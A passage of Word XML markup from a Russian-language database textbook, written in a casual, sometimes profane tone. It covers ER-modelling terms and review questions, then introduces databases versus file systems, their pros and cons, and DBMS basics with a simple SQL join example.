    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: «толстая» таблица, долгие запросы, нарушение принципа единственной ответственности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>: декомпозиция на несколько таблиц (`Пользователь`, `Профиль`, `Настройки`, `Статистика`, `Платёжная_информация`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Инфологическая модель** — концептуальная модель предметной области, описывающая сущности и связи без привязки к СУБД.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ER-диаграмма** — графическое представление сущностей и связей (Entity-Relationship Diagram).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сущность (Entity)** — объект реального мира, информацию о котором мы храним (например, Студент, Курс).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Атрибут (Attribute)** — свойство сущности (например, фамилия, дата_рождения).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Первичный ключ (Primary Key, PK)** — атрибут, однозначно идентифицирующий экземпляр сущности.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Внешний ключ (Foreign Key, FK)** — атрибут, ссылающийся на первичный ключ другой таблицы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Связь (Relationship)** — ассоциация между сущностями (например, «Студент учится на Курсе»).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кардинальность** — количественная характеристика связи: 1:1, 1:N, M:N.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Слабая сущность** — сущность, не имеющая собственного первичного ключа и зависящая от другой сущности.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Суррогатный ключ** — искусственный идентификатор (обычно `id`), не имеющий бизнес-смысла.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Естественный ключ** — ключ, имеющий бизнес-смысл (например, `номер_паспорта`, `ISBN`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нотация Crow's Foot** — популярная нотация ER-диаграмм с символами в виде вороньих лапок для обозначения кардинальности.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обязательность связи** — должна ли сущность участвовать в связи (обязательная | или необязательная ○).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Теоретические вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличается инфологическая модель от даталогической и физической?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Ответ: Инфологическая — концептуальное описание предметной области без привязки к СУБД. Даталогическая — структура таблиц с типами данных (реляционная модель). Физическая — реализация в конкретной СУБД с индексами, триггерами, хранимыми процедурами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое кардинальность связи? Перечислите три типа.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Ответ: Кардинальность — количественная характеристика связи между сущностями. Типы: 1:1 (один-к-одному), 1:N (один-ко-многим), M:N (многие-ко-многим).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему связь M:N нельзя реализовать напрямую в реляционной БД? Как её реализовать?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Ответ: В реляционной БД нельзя хранить массивы внешних ключей в одном поле. Решение: создать промежуточную таблицу (associative entity) с двумя внешними ключами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Спроектируйте ER-диаграмму для системы управления проектами. Сущности: Пользователь, Проект, Задача, Комментарий.**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Подсказка:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь 1 — N Проект (один пользователь создаёт много проектов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проект 1 — N Задача (проект содержит много задач)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 1 — N Комментарий (задача имеет много комментариев)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь M — N Проект (участники проекта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь 1 — N Задача (исполнитель задачи)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В интернет-магазине таблица "Позиция_заказа" содержит атрибуты: заказ_id, товар_id, количество, цена_за_единицу. Почему важно хранить цену_за_единицу, а не брать её из таблицы Товар?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Ответ: Цена товара может измениться. Если хранить только ссылку на товар, то при изменении цены в таблице Товар изменится и сумма в старых заказах. Это приведёт к несоответствию между суммой заказа и фактически оплаченной суммой. Поэтому цена фиксируется на момент создания заказа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Инфологическое моделирование — это первый и самый важный шаг в проектировании БД. Хорошая ER-диаграмма — это половина успеха. Если накосячить на этом этапе, то дальше будет только хуже: кривые таблицы, аномалии, баги, бесконечные миграции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Потрать время на продумывание модели. Нарисуй диаграмму, покажи коллегам (или преподавателю), поищи дырки. Лучше исправить ошибку в диаграмме, чем потом переписывать половину кода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">И помни: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ER-диаграмма не высечена в камне</w:t>
      </w:r>
      <w:r>
        <w:t>. Требования меняются, бизнес-логика меняется, модель тоже меняется. Главное — фиксировать изменения и обновлять документацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Удачи с моделированием! В следующей главе разберём архитектуру БД и преобразование ER-диаграмм в реляционные таблицы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 7.2. Понятие база данных. Архитектура БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Помнишь времена, когда все данные хранились в файлах Excel? Или ещё хуже — в текстовых файлах? Представь: у тебя интернет-магазин, и данные о клиентах лежат в `clients.txt`, заказы — в `orders.xlsx`, товары — в `products.csv`. А теперь надо узнать, кто купил самый дорогой товар за последний месяц. Приятного аппетита — полдня гребёшься в файлах, сводишь данные вручную, и в итоге получаешь хуйню, потому что кто-то удалил строку или перепутал ID.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Вот для того, чтобы не страдать этой хернёй, и придумали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>базы данных (БД)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Это не просто "папка с файлами", а </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>организованная система хранения данных</w:t>
      </w:r>
      <w:r>
        <w:t>, которая умеет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстро искать (индексы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Контролировать целостность (если удалили товар, заказы на него тоже удаляются)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работать с тысячами пользователей одновременно (многопользовательский доступ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Откатывать изменения, если что-то пошло не так (транзакции)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Защищать данные от несанкционированного доступа (права доступа)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 4.1 (Жизненный цикл БД)** — там мы разобрали фазы проектирования и эксплуатации БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 7.1 (Инфологическое моделирование)** — это концептуальный уровень архитектуры БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 7.3 (Реляционные БД)** — детально разберём реляционную модель и нормализацию</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.1. Понятие базы данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>База данных (БД, Database)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это структурированная совокупность данных, организованная по определённым правилам, которая позволяет эффективно хранить, обрабатывать и извлекать информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевые слова:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Структурированная** — данные не валяются кучей, а организованы (таблицы, связи, ключи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Совокупность** — не один файл, а множество взаимосвязанных данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**По правилам** — есть схема БД (какие таблицы, какие столбцы, какие типы данных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Эффективно** — быстрый поиск, минимум избыточности, контроль целостности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>БД vs файловая система</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Почему БД лучше, чем папка с файлами? Сравним:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Критерий | Файловая система | База данных |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|------------------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Избыточность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Дублирование данных (один клиент в 10 файлах) | Нормализация (клиент один раз в таблице) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Целостность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Нет контроля (можно удалить клиента, заказы останутся) | Контроль (внешние ключи, каскадное удаление) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Многопользовательский доступ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Блокировки файлов, конфликты | Транзакции, изоляция, MVCC |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Поиск</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Линейный (O(n)) по всему файлу | Индексы (O(log n)) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Безопасность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Права доступа к файлам (грубо) | Детальные права (на таблицу, столбец, строку) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Резервное копирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Копировать каждый файл | Одна команда `mysqldump` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Язык запросов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Нет (пиши парсер вручную) | SQL (стандартизирован) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Проблема файловой системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Представь: у тебя интернет-магазин, данные хранятся в файлах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Файл `clients.txt`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1|Иванов Иван|ivan@mail.ru|Москва, ул. Ленина, 10</w:t>
        <w:br/>
        <w:t>2|Петров Пётр|petr@mail.ru|СПб, Невский проспект, 5</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Файл `orders.txt`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>101|1|Носки|150|2025-01-10</w:t>
        <w:br/>
        <w:t>102|2|Трусы|200|2025-01-11</w:t>
        <w:br/>
        <w:t>103|1|Майка|300|2025-01-12</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти все заказы клиента `ivan@mail.ru`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Открыть `clients.txt`, найти строку с `ivan@mail.ru`, взять ID (это `1`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Открыть `orders.txt`, пройтись по всем строкам, выбрать те, где второе поле = `1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Вручную склеить данные</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если у тебя 1 млн заказов, будешь читать весь файл (медленно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если два пользователя одновременно меняют файл, один потеряет изменения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если удалить клиента из `clients.txt`, заказы в `orders.txt` станут "висячими" (ID несуществующего клиента)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если в `orders.txt` опечатка (ID клиента `999`, которого нет), заказ "потеряется"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>С базой данных:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Найти все заказы клиента ivan@mail.ru</w:t>
        <w:br/>
        <w:t>SELECT orders.*</w:t>
        <w:br/>
        <w:t>FROM orders</w:t>
        <w:br/>
        <w:t>JOIN clients ON orders.client_id = clients.id</w:t>
        <w:br/>
        <w:t>WHERE clients.email = 'ivan@mail.ru';</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Запрос выполняется за миллисекунды (индексы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если удалить клиента, можно настроить каскадное удаление заказов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если попытаться добавить заказ с несуществующим `client_id`, БД выдаст ошибку (целостность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Преимущества БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Централизация данных**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Все данные в одном месте, а не разбросаны по 100 файлам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Контроль целостности**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Можно задать правила:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Первичный ключ (PRIMARY KEY) — уникальность записей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Внешний ключ (FOREIGN KEY) — связи между таблицами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ограничения (CHECK) — например, цена товара &gt; 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Многопользовательский доступ**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   1000 пользователей одновременно могут читать и писать, и никто никому не мешает (благодаря </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>транзакциям</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>блокировкам</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Безопасность**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Можно настроить права доступа:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь `admin` видит всё</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь `manager` видит только таблицу `orders`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь `guest` может только читать, но не изменять</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Резервное копирование**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Одна команда — и вся БД сохранена. Можно настроить автоматические бэкапы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Язык запросов (SQL)**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Стандартизированный язык для работы с данными. Выучил раз — используешь везде (MySQL, PostgreSQL, Oracle).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Недостатки БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Но не всё так радужно:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложность**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Надо учить SQL, понимать нормализацию, настраивать СУБД. Для маленького проекта (10 записей) — овёркилл.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Стоимость**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Некоторые СУБД (Oracle, MS SQL Server) стоят дофига денег. Хотя есть бесплатные (PostgreSQL, MySQL, SQLite).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Производительность**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Для некоторых задач (например, обработка больших файлов log'ов) БД медленнее, чем просто чтение файлов. Или если нужна сверхнизкая задержка (real-time системы), БД может быть узким местом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Зависимость от СУБД**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Если написал кучу SQL-запросов под MySQL, а потом решил переехать на PostgreSQL, часть запросов надо переписывать (хотя стандарт SQL единый, в деталях отличия есть).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.2. СУБД (Система Управления Базами Данных)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>СУБД (DBMS, Database Management System)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программное обеспечение для создания, управления и доступа к базам данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
